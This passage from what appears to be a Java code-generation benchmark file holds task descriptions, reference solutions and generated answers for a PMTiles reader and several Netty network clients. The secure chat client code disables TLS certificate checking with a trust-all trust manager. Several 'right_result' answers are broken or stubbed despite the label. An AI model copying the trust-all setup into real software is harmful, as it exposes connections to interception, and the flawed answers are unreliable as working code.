    "Instruction": "Task Description: Implement a Java class that reads and processes PMTiles archives, providing access to individual tiles and their metadata using Java NIO's FileChannel for efficient file operations.\n\nClass Description: ReadablePmtiles is a concrete implementation of the ReadableTileArchive interface that enables reading and navigating through a PMTiles archive format. It uses FileChannel for efficient random access to file contents and handles compressed directory structures within the archive.\n\nAttributes:\n- channel: [SeekableByteChannel] - The underlying byte channel for reading the PMTiles file\n- header: [Pmtiles.Header] - The parsed header information from the PMTiles archive\n\nMethods:\n- newReadFromFile: [static](Path path) -> [ReadableTileArchive] - Static factory method that creates a new instance by opening a file channel to the specified path\n- getTile: [int x, int y, int z] -> [byte[]] - Retrieves the tile data at the specified coordinates (x,y,z) or returns null if not found\n- close: [] -> [void] - Closes the underlying file channel and releases system resources\n- getAllTiles: [] -> [CloseableIterator<Tile>] - Returns an iterator over all tiles in the archive\n- getBytes: [private](long start, int length) -> [byte[]] - Internal method to read bytes from the channel at specified position\n- readDir: [private](long offset, int length) -> [List<Pmtiles.Entry>] - Reads and parses a directory from the archive\n- getTiles: [private](List<Pmtiles.Entry> dir) -> [Stream<Tile>] - Converts directory entries into a stream of tiles",
    "Canonical_solution": "import com.onthegomap.planetiler.archive.ReadableTileArchive;\nimport com.onthegomap.planetiler.archive.Tile;\nimport com.onthegomap.planetiler.archive.TileArchiveMetadata;\nimport com.onthegomap.planetiler.archive.TileCompression;\nimport com.onthegomap.planetiler.geo.TileCoord;\nimport com.onthegomap.planetiler.util.CloseableIterator;\nimport com.onthegomap.planetiler.util.Gzip;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.stream.IntStream;\nimport java.util.stream.Stream;\nimport org.locationtech.jts.geom.Coordinate;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n  private final SeekableByteChannel channel;\n  private final Pmtiles.Header header;\n\n  public ReadablePmtiles(SeekableByteChannel channel) throws IOException {\n    this.channel = channel;\n    this.header = Pmtiles.Header.fromBytes(getBytes(0, Pmtiles.HEADER_LEN));\n  }\n\n  public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n    return new ReadablePmtiles(FileChannel.open(path, StandardOpenOption.READ));\n  }\n\n  private synchronized byte[] getBytes(long start, int length) throws IOException {\n    channel.position(start);\n    var buf = ByteBuffer.allocate(length);\n    channel.read(buf);\n    return buf.array();\n  }\n\n  @Override\n  @SuppressWarnings(\"java:S1168\")\n  public byte[] getTile(int x, int y, int z) {\n    try {\n      var tileId = TileCoord.ofXYZ(x, y, z).hilbertEncoded();\n      long dirOffset = header.rootDirOffset();\n      int dirLength = (int) header.rootDirLength();\n\n      for (int depth = 0; depth <= 3; depth++) {\n        byte[] dirBytes = getBytes(dirOffset, dirLength);\n        if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n          dirBytes = Gzip.gunzip(dirBytes);\n        }\n\n        var dir = Pmtiles.directoryFromBytes(dirBytes);\n        var entry = findTile(dir, tileId);\n        if (entry != null) {\n          if (entry.runLength() > 0) {\n            return getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          } else {\n            dirOffset = header.leafDirectoriesOffset() + entry.offset();\n            dirLength = entry.length();\n          }\n        } else {\n          return null;\n        }\n      }\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not get tile\", e);\n    }\n    return null;\n  }\n\n  @Override\n  public void close() throws IOException {\n    channel.close();\n  }\n\n  private List<Pmtiles.Entry> readDir(long offset, int length) {\n    try {\n      var buf = getBytes(offset, length);\n      if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n        buf = Gzip.gunzip(buf);\n      }\n      return Pmtiles.directoryFromBytes(buf);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public CloseableIterator<Tile> getAllTiles() {\n    List<Pmtiles.Entry> rootDir = readDir(header.rootDirOffset(), (int) header.rootDirLength());\n    return CloseableIterator.of(getTiles(rootDir));\n  }\n\n  private Stream<Tile> getTiles(List<Pmtiles.Entry> dir) {\n    return dir.stream().mapMulti((entry, next) -> {\n      try {\n        if (entry.runLength == 0) {\n          getTiles(readDir(header.leafDirectoriesOffset() + entry.offset(), entry.length())).forEach(next);\n        } else {\n          var data = getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          for (int i = 0; i < entry.runLength(); i++) {\n            next.accept(new Tile(TileCoord.hilbertDecode((int) (entry.tileId() + i)), data));\n          }\n        }\n      } catch (IOException e) {\n        throw new IllegalStateException(\"Failed to iterate through pmtiles archive \", e);\n      }\n    });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.stream.Stream;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n    private final SeekableByteChannel channel;\n    private final Pmtiles.Header header;\n\n    public ReadablePmtiles(SeekableByteChannel channel, Pmtiles.Header header) {\n        this.channel = channel;\n        this.header = header;\n    }\n\n    public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n        try (FileChannel channel = FileChannel.open(path)) {\n            Pmtiles.Header header = parseHeader(channel);\n            return new ReadablePmtiles(channel, header);\n        }\n    }\n\n    private static Pmtiles.Header parseHeader(SeekableByteChannel channel) throws IOException {\n        return new Pmtiles.Header();\n    }\n\n    public byte[] getTile(int x, int y, int z) {\n        List<Pmtiles.Entry> entries = readDir(header.getDirectoryOffset(), header.getDirectoryLength());\n        for (Pmtiles.Entry entry : entries) {\n            if (entry.getX() == x && entry.getY() == y && entry.getZ() == z) {\n                channel.position(entry.getOffset());\n                return getBytes(entry.getOffset(), entry.getSize());\n            }\n        }\n        return null;\n    }\n\n    private byte[] getBytes(long start, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.read(buffer);\n        return buffer.array();\n    }\n\n    private List<Pmtiles.Entry> readDir(long offset, int length) throws IOException {\n        return new ArrayList<>();\n    }\n\n    public void close() throws IOException {\n        channel.close();\n    }\n\n    public CloseableIterator<Tile> getAllTiles() {\n        Stream<Tile> tilesStream = getTiles(readDir(header.getDirectoryOffset(), header.getDirectoryLength()));\n        return new CloseableIterator<>(tilesStream);\n    }\n\n    private Stream<Tile> getTiles(List<Pmtiles.Entry> dir) {\n        return dir.stream().map(this::toTile);\n    }\n\n    private Tile toTile(Pmtiles.Entry entry) {\n        return new Tile(entry.getOffset(), entry.getSize());\n    }\n}"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a proxy server, handle SSL encryption if enabled, manage connection lifecycle, and support reconnection with exponential backoff.\n\nClass Description: ProxyClientContainer is a Netty-based TCP client container that establishes and maintains a connection to a proxy server. It handles SSL encryption when configured, manages connection retries with exponential backoff, and provides channel management for proxy communication.\n\nAttributes:\n- logger: [Logger] - SLF4J logger instance for logging events\n- workerGroup: [NioEventLoopGroup] - Netty event loop group for handling I/O operations\n- bootstrap: [Bootstrap] - Primary bootstrap for proxy server connections\n- realServerBootstrap: [Bootstrap] - Bootstrap for real server connections\n- config: [Config] - Configuration instance for client settings\n- sslContext: [SSLContext] - SSL context for secure connections (nullable)\n- sleepTimeMill: [long] - Current sleep duration for reconnection attempts\n\nMethods:\n- ProxyClientContainer() -> [void] - Constructor that initializes worker group, bootstraps, and configures channel pipelines\n- start() -> [void] - Starts the client by initiating connection to proxy server\n- createSslHandler(SSLContext sslContext) -> [ChannelHandler] - Creates SSL handler for secure connections\n- connectProxyServer() -> [void] - Connects to proxy server with retry logic on failure\n- stop() -> [void] - Shuts down the client gracefully\n- channelInactive(ChannelHandlerContext ctx) -> [void] - Handles channel inactive events by triggering reconnection\n- reconnectWait() -> [void] - Implements exponential backoff for reconnection attempts",
    "Canonical_solution": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.client.handlers.ClientChannelHandler;\nimport org.fengfei.lanproxy.client.handlers.RealServerChannelHandler;\nimport org.fengfei.lanproxy.common.Config;\nimport org.fengfei.lanproxy.protocol.IdleCheckHandler;\nimport org.fengfei.lanproxy.protocol.ProxyMessage;\nimport org.fengfei.lanproxy.protocol.ProxyMessageDecoder;\nimport org.fengfei.lanproxy.protocol.ProxyMessageEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class ProxyClientContainer {\n\n    private static Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n\n    private NioEventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n    private Bootstrap realServerBootstrap;\n    private Config config = Config.getInstance();\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer() {\n        workerGroup = new NioEventLoopGroup();\n        realServerBootstrap = new Bootstrap();\n        realServerBootstrap.group(workerGroup);\n        realServerBootstrap.channel(NioSocketChannel.class);\n        realServerBootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new RealServerChannelHandler());\n            }\n        });\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                if (Config.getInstance().getBooleanValue(\"ssl.enable\", false)) {\n                    if (sslContext == null) {\n                        sslContext = SslContextCreator.createSSLContext();\n                    }\n                    ch.pipeline().addLast(createSslHandler(sslContext));\n                }\n                ch.pipeline().addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                ch.pipeline().addLast(new ProxyMessageEncoder());\n                ch.pipeline().addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, IdleCheckHandler.WRITE_IDLE_TIME - 10, 0));\n                ch.pipeline().addLast(new ClientChannelHandler(realServerBootstrap, bootstrap, ProxyClientContainer.this));\n            }\n        });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(true);\n        return new SslHandler(sslEngine);\n    }\n\n    private void connectProxyServer() {\n        bootstrap.connect(config.getStringValue(\"server.host\"), config.getIntValue(\"server.port\")).addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (future.isSuccess()) {\n                    ProxyMessage proxyMessage = new ProxyMessage();\n                    proxyMessage.setType(ProxyMessage.C_TYPE_AUTH);\n                    proxyMessage.setUri(config.getStringValue(\"client.key\"));\n                    future.channel().writeAndFlush(proxyMessage);\n                    sleepTimeMill = 1000;\n                    logger.info(\"connect proxy server success, {}\", future.channel());\n                } else {\n                    logger.warn(\"connect proxy server failed\", future.cause());\n                    reconnectWait();\n                    connectProxyServer();\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            if (sleepTimeMill > 60000) {\n                sleepTimeMill = 1000;\n            }\n            synchronized (this) {\n                sleepTimeMill = sleepTimeMill * 2;\n                wait(sleepTimeMill);\n            }\n        } catch (InterruptedException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.SSLContext;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProxyClientContainer extends ChannelInboundHandlerAdapter {\n    private final Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final Bootstrap realServerBootstrap = new Bootstrap();\n    private final Config config;\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer() {\n        this.config = new Config();\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        if (sslContext != null) {\n                            ch.pipeline().addLast(createSslHandler(sslContext));\n                        }\n                        ch.pipeline().addLast(new ProxyClientHandler());\n                    }\n                });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        return new SslHandler(sslContext);\n    }\n\n    private void connectProxyServer() {\n        ChannelFuture future = bootstrap.connect(config.getProxyHost(), config.getProxyPort());\n        future.addListener((ChannelFutureListener) future1 -> {\n            if (future1.isSuccess()) {\n                logger.info(\"Connected to proxy server\");\n            } else {\n                logger.error(\"Failed to connect to proxy server\", future1.cause());\n                reconnectWait();\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n        logger.warn(\"Channel inactive, attempting reconnection\");\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        int maxRetry = 60;\n        int retryCount = 0;\n        while (sleepTimeMill < maxRetry * 1000) {\n            try {\n                TimeUnit.MILLISECONDS.sleep(sleepTimeMill);\n                sleepTimeMill *= 2;\n                retryCount++;\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                break;\n            }\n        }\n    }\n\n    private static class ProxyClientHandler extends ChannelInboundHandlerAdapter {\n        // Implement message handling logic here\n    }\n}"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle Protocol Buffers (protobuf) message encoding/decoding, and manage connection lifecycle.\n\nClass Description: ProtobufProxy is a Netty-based TCP client implementation that connects to a specified server address and port, configures a pipeline for protobuf message processing, and manages connection resources. It implements a Proxy interface and handles graceful shutdown of network resources.\n\nMethods:\n\nconnect: [connect](String serverAddress, int port) -> void - Establishes a TCP connection to the specified server address and port. Configures the Netty pipeline with protobuf handlers and connection management components. The method blocks until the connection is closed and ensures proper resource cleanup.\n\nInput:\n- serverAddress: String - The IP address or hostname of the server to connect to\n- port: int - The TCP port number of the server\n\nOutput: None (void) - The method establishes a persistent connection that remains active until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.ProtobufTransferHandler;\nimport org.nico.ratel.landlords.client.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.entity.ClientTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(0, 4, 0, TimeUnit.SECONDS))\n                                    .addLast(new ProtobufVarint32FrameDecoder())\n                                    .addLast(new ProtobufDecoder(ClientTransferData.ClientTransferDataProtoc.getDefaultInstance()))\n                                    .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                    .addLast(new ProtobufEncoder())\n                                    .addLast(new SecondProtobufCodec())\n                                    .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.protobuf.ProtobufDecoder;  \nimport io.netty.handler.codec.protobuf.ProtobufEncoder;  \nimport io.netty.handler.logging.LogLevel;  \nimport io.netty.handler.logging.LoggingHandler;  \n\npublic class ProtobufProxy implements Proxy {  \n    private final EventLoopGroup group;  \n    private Channel channel;  \n\n    public ProtobufProxy() {  \n        group = new NioEventLoopGroup();  \n    }  \n\n    public void connect(String serverAddress, int port) throws InterruptedException {  \n        Bootstrap bootstrap = new Bootstrap();  \n        bootstrap.group(group)  \n                .channel(NioSocketChannel.class)  \n                .handler(new ChannelInitializer<SocketChannel>() {  \n                    @Override  \n                    protected void initChannel(SocketChannel ch) throws Exception {  \n                        ChannelPipeline pipeline = ch.pipeline();  \n                        pipeline.addLast(new LoggingHandler(LogLevel.INFO));  \n                        pipeline.addLast(new ProtobufDecoder(Message.class));  \n                        pipeline.addLast(new ProtobufEncoder());  \n                        pipeline.addLast(new ClientHandler());  \n                    }  \n                });  \n\n        ChannelFuture future = bootstrap.connect(serverAddress, port).sync();  \n        channel = future.channel();  \n        future.channel().closeFuture().await();  \n    }  \n\n    public void shutdown() {  \n        group.shutdownGracefully();  \n    }  \n\n    private static class ClientHandler extends SimpleChannelInboundHandler<Message> {  \n        @Override  \n        protected void channelRead0(ChannelHandlerContext ctx, Message msg) {  \n            System.out.println(\"Received: \" + msg);  \n        }  \n\n        @Override  \n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n            cause.printStackTrace();  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Java class that implements a Netty TCP client for establishing and managing non-blocking TCP connections to a remote server, handling message sending, and providing reconnection capabilities.\n\nClass Description: The `NettyClient` class is a Spring component that manages a Netty-based TCP client. It handles connection establishment, message sending, automatic reconnection on failure, and graceful shutdown. The client uses Netty's non-blocking I/O model with NioSocketChannel for efficient communication.\n\nAttributes:\n- `RECONNECT_SECONDS`: Integer - The delay in seconds before attempting to reconnect after a connection failure.\n- `logger`: Logger - SLF4J logger for logging client activities and errors.\n- `serverHost`: String - The host address of the remote server to connect to (injected via Spring).\n- `serverPort`: Integer - The port number of the remote server to connect to (injected via Spring).\n- `eventGroup`: EventLoopGroup - Netty event loop group for managing I/O threads.\n- `channel`: Channel - The active channel representing the connection to the server (volatile for thread safety).\n\nMethods:\n- `start()`: void - Initializes and starts the Netty client, attempting to connect to the server. Uses Bootstrap to configure client settings and sets up connection listener.\n- `reconnect()`: void - Schedules a reconnection attempt after a connection failure, using the specified RECONNECT_SECONDS delay.\n- `shutdown()`: void - Gracefully shuts down the client by closing the active channel and releasing event loop resources (annotated with @PreDestroy for Spring lifecycle management).\n- `send(Invocation invocation)`: void - Sends a message to the server through the active channel. Validates channel state before sending.",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyclientdemo.client.handler.NettyClientHandlerInitializer;\nimport cn.iocoder.springboot.lab67.nettycommondemo.codec.Invocation;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final Integer RECONNECT_SECONDS = 20;\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.server.host}\")\n    private String serverHost;\n    @Value(\"${netty.server.port}\")\n    private Integer serverPort;\n\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(serverHost, serverPort)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new NettyClientHandlerInitializer());\n\n        bootstrap.connect().addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (!future.isSuccess()) {\n                    logger.error(\"[start][Netty Client connection to server({}:{}) failed]\", serverHost, serverPort);\n                    reconnect();\n                    return;\n                }\n                channel = future.channel();\n                logger.info(\"[start][Netty Client connected to server({}:{}) successfully]\", serverHost, serverPort);\n            }\n        });\n    }\n\n    public void reconnect() {\n        eventGroup.schedule(new Runnable() {\n            @Override\n            public void run() {\n                logger.info(\"[reconnect][Starting reconnection]\");\n                try {\n                    start();\n                } catch (InterruptedException e) {\n                    logger.error(\"[reconnect][Reconnection failed]\", e);\n                }\n            }\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n        logger.info(\"[reconnect][Will attempt reconnection in {} seconds]\", RECONNECT_SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null) {\n            logger.error(\"[send][Connection does not exist]\");\n            return;\n        }\n        if (!channel.isActive()) {\n            logger.error(\"[send][Connection({}) is not active]\", channel.id());\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.logging.LoggingHandler;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final int RECONNECT_SECONDS = 5;\n\n    private final Logger logger = LoggerFactory.getLogger(NettyClient.class);\n\n    @Value(\"${server.host}\")\n    private String serverHost;\n\n    @Value(\"${server.port}\")\n    private int serverPort;\n\n    private final EventLoopGroup eventGroup = new NioEventLoopGroup();\n\n    private volatile Channel channel;\n\n    private final ScheduledExecutorService scheduler = new ScheduledThreadPoolExecutor(1);\n\n    public void start() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                 .channel(NioSocketChannel.class)\n                 .handler(new ChannelInitializer<Channel>() {\n                     @Override\n                     protected void initChannel(Channel ch) throws Exception {\n                         ch.pipeline().addLast(new LoggingHandler(LogLevel.INFO));\n                     }\n                 });\n        ChannelFuture future = bootstrap.connect(serverHost, serverPort).sync();\n        channel = future.channel();\n        future.addListener((ChannelFutureListener) future1 -> {\n            if (future1.isSuccess()) {\n                logger.info(\"Connected to server\");\n            } else {\n                logger.error(\"Connection failed\", future1.cause());\n                reconnect();\n            }\n        });\n    }\n\n    private void reconnect() {\n        scheduler.schedule(() -> {\n            try {\n                start();\n            } catch (Exception e) {\n                logger.error(\"Failed to reconnect\", e);\n            }\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null || !channel.isActive() || !channel.isRegistered()) {\n            logger.warn(\"Channel is not active. Cannot send message.\");\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}\n```"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an SSL encrypted connection to a remote server, sends user input messages, and gracefully handles connection termination.\n\nClass Description: SecureChatClient is a Netty-based TCP client that connects to a secure chat server, sends messages from standard input, and properly manages connection lifecycle and resources.\n\nAttributes:\nHOST: String - The server host address (default: \"127.0.0.1\")\nPORT: int - The server port number (default: 8992)\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures Netty client, establishes connection, handles user input, and manages shutdown\n    - args: String[] - Command line arguments (unused in current implementation)\n    - Returns: void",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx = SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new SecureChatClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.Channel; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelInitializer; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.SocketChannel; import io.netty.channel.socket.nio.NioSocketChannel; import io.netty.handler.codec.string.StringDecoder; import io.netty.handler.codec.string.StringEncoder; import io.netty.handler.codec.LineBasedFrameDecoder; import io.netty.handler.ssl.SslContext; import io.netty.handler.ssl.SslContextBuilder; import io.netty.handler.ssl.TrustManager; import io.netty.handler.ssl.SslHandler; import io.netty.buffer.Unpooled; import io.netty.channel.SimpleChannelInboundHandler; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.net.InetSocketAddress; import java.security.KeyStore; import java.security.KeyManager; import java.security.cert.X509Certificate; import java.util.concurrent.TimeUnit; public class SecureChatClient { private static final String DEFAULT_HOST = \"127.0.0.1\"; private static final int DEFAULT_PORT = 8992; public static void main(String[] args) throws Exception { String host = DEFAULT_HOST; int port = DEFAULT_PORT; if (args.length > 0) { host = args[0]; if (args.length > 1) { port = Integer.parseInt(args[1]); } } // Setup SSL context SslContext sslCtx = new SslContextBuilder() .sslProvider(SSLContext.SSL_PROVIDER) .trustManager(new X509TrustManager() { public void checkClientTrusted(X509Certificate[] chain, String authType) {} public void checkServerTrusted(X509Certificate[] chain, String authType) {} public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } }) .build(); // Configure the client 